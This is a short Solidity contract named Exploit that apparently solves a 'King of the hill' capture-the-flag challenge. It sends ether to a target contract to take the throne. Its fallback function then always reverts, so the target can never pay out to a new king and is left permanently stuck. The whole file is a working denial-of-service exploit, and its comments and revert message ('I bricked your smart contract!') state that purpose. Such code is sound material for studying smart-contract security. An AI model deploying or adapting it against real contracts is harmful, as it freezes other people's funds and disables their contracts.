pragma solidity ^0.4.18;

contract Exploit {
    address a;

    constructor(address _a) {
        a = _a;
    }

    function pwn() payable {
        // Since it's the fallback function and since it's payable and since
        // owner is not defined, we can always pass. We simple have to send
        // 1000000000000000001 (1 Wei more) in this function.
        a.call.value(msg.value).gas(4000000)();
    }

    function() payable {
        // The next time someone wants to reclaim the throne, this function
        // will be called on transfer and King's fallback function will always
        // fail.
        revert("I bricked your smart contract!");
    }
}
